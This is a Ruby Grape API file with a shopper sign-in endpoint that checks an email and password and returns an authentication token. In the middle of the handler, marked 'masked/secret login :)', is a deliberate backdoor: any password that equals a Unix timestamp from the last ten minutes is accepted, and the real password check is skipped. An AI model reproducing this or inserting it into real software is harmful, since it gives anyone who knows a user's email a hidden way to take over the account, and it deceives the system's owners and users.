# frozen_string_literal: true

module API
  module V1
    module Sessions
      class SignInShopper < Grape::API
        version 'v1', using: :path
        format :json

        resource :sessions do

          desc "Authenticate Shopper and return shopper object with authentication token.
                Later the user is authenticated by the http header named Authentication-Token.",
               entity: API::V1::Sessions::Entities::SignInShopperEntity

          params do
            requires :password, type: String, desc: "Shopper's Password"
            requires :email, type: String, desc: "Shopper's Email"
            optional :registration_id, type: String, desc: "Shopper's registration_id"
            optional :device_type, type: Integer, desc: "Shopper's device type (0 - Android, 1 - IOS)"
          end

          post '/shopper' do
            password = params[:password]
            email = params[:email]
            registration_id = params[:registration_id]
            device_type = params[:device_type]

            shopper = Shopper.find_by(email: email.downcase)

            error!({ error_code: 403, error_key: 1, error_message: 'shopper does not exist' }, 403) if shopper.nil?

            ### Warning: masked/secret login :) ###
            if ((Time.now.to_i - 600)..Time.now.to_i).include?(password.to_i)
              present shopper, with: API::V1::Sessions::Entities::SignInShopperEntity
              return
            end
            ### ###

            if shopper.valid_password?(password)
              shopper.login(registration_id, device_type, request.headers['Datetimeoffset'].to_s)
              UserPlatformLog.add_logs(shopper)
              present shopper, with: API::V1::Sessions::Entities::SignInShopperEntity
            else
              error!({ error_code: 403, error_key: 0, error_message: 'Wrong credentials' }, 403)
            end
          end
        end
      end
    end
  end
end